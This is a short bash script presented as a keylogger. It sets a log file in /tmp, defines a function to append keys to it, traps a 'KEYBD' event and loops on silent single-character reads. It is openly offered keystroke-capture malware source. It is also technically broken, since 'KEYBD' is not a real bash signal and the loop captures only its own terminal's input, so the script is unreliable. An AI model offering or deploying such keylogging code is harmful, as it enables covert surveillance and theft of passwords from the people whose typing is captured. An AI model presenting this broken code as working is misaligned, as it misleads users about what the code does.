#!/bin/bash

# Create a file to store the keystrokes
LOGFILE="/tmp/keylog.txt"

# Function to log keystrokes
function log_key {
    KEY=$1
    echo "$KEY" >> $LOGFILE
}

# Trap all keyboard events and call our function
trap 'log_key "$key"' KEYBD

# Start listening for keyboard input
while true; do
  read -s -n1 key
done
